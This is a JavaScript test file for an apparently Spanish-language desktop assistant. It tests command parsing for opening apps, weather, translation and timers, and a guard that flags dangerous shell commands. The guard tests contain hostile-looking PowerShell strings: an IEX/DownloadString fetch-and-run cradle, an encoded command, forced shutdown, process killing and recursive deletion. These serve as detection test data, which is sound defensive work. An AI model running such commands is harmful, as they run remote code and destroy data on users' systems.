const assert = require('assert')
const path = require('path')

process.chdir(path.join(__dirname, '..'))

let passed = 0, failed = 0

function test(name, fn) {
  try { fn(); passed++; console.log(`  ✓ ${name}`) }
  catch (e) { failed++; console.log(`  ✗ ${name}: ${e.message}`) }
}

async function run() {
console.log('\ncommand-parser.js')
const parser = require('../src/main/command-parser')

test('abre chrome', () => {
  const r = parser.parse('abre chrome')
  assert.equal(r.command, 'abre')
  assert.equal(r.args, 'chrome')
})

test('abrir chrome (alias)', () => {
  const r = parser.parse('abrir chrome')
  assert.equal(r.command, 'abre')
})

test('clima en Madrid', () => {
  const r = parser.parse('clima en Madrid')
  assert.equal(r.command, 'clima')
  assert.equal(r.args, 'madrid')
})

test('cómo está el clima', () => {
  const r = parser.parse('cómo está el clima')
  assert.equal(r.command, 'clima')
  assert.equal(r.args, '')
})

test('temperatura en Barcelona', () => {
  const r = parser.parse('temperatura en Barcelona')
  assert.equal(r.command, 'clima')
  assert.equal(r.args, 'barcelona')
})

test('traduce hola al inglés', () => {
  const r = parser.parse('traduce hola al inglés')
  assert.equal(r.command, 'traduce')
  assert.equal(r.args, 'hola al inglés')
})

test('detente', () => {
  const r = parser.parse('detente')
  assert.equal(r.command, 'detente')
})

test('alarma en 5 minutos', () => {
  const r = parser.parse('alarma en 5 minutos')
  assert.equal(r.command, 'alarma')
  assert.equal(r.args, '5 minutos')
})

test('stop word filtering', () => {
  const r = parser.parse('abre el chrome')
  assert.equal(r.args, 'chrome')
})

test('greeting stripping', () => {
  const r = parser.parse('oye abre chrome')
  assert.equal(r.command, 'abre')
})

console.log('\ncommands/timer.js')
const timer = require('../src/main/commands/timer')

test('parseDuration 10 segundos', () => {
  const dur = timer.parseDuration?.('10 segundos')
  assert.ok(dur)
  assert.equal(dur.amount, 10)
  assert.equal(dur.ms, 10000)
})

test('parseDuration 1 hora', () => {
  const dur = timer.parseDuration?.('1 hora')
  assert.ok(dur)
  assert.equal(dur.amount, 1)
  assert.equal(dur.ms, 3600000)
})

console.log('\ncommands/translate.js')
const translate = require('../src/main/commands/translate')

test('parse "hola al inglés"', () => {
  const p = translate.parse?.('hola al inglés')
  assert.ok(p)
  assert.equal(p.text, 'hola')
  assert.equal(p.lang, 'en')
})

test('parse "hello a español"', () => {
  const p = translate.parse?.('hello a español')
  assert.ok(p)
  assert.equal(p.text, 'hello')
  assert.equal(p.lang, 'es')
})

console.log('\ncommands/weather.js')
const weather = require('../src/main/commands/weather')

try {
  const r = await weather.execute('Madrid')
  test('execute("Madrid") returns success', () => {
    assert.equal(r.success, true)
    assert.ok(r.message.includes('°C'))
  })
} catch (e) {
  test('execute("Madrid") should not throw', () => {
    throw new Error(e.message)
  })
}

console.log('\nmain/guard.js')
const guard = require('../src/main/guard')

test('detecta shutdown', () => {
  assert.equal(guard.isDangerous('shutdown /s /t 30'), true)
})

test('detecta Stop-Process -Force', () => {
  assert.equal(guard.isDangerous('Get-Process | Stop-Process -Force'), true)
})

test('detecta IEX + DownloadString', () => {
  assert.equal(guard.isDangerous('IEX (New-Object Net.WebClient).DownloadString("http://x")'), true)
})

test('detecta EncodedCommand', () => {
  assert.equal(guard.isDangerous('powershell -EncodedCommand aGVsbG8='), true)
})

test('detecta Remove-Item -Recurse', () => {
  assert.equal(guard.isDangerous('Remove-Item -Path C:\\x -Recurse -Force'), true)
})

test('permite diagnóstico de solo lectura', () => {
  assert.equal(guard.isDangerous('Get-Process | Select-Object Name, Id'), false)
})

test('permite texto normal', () => {
  assert.equal(guard.isDangerous('qué hora es'), false)
})

console.log(`\n${passed + failed} tests, ${passed} passed, ${failed} failed\n`)
process.exit(failed ? 1 : 0)
}

run()
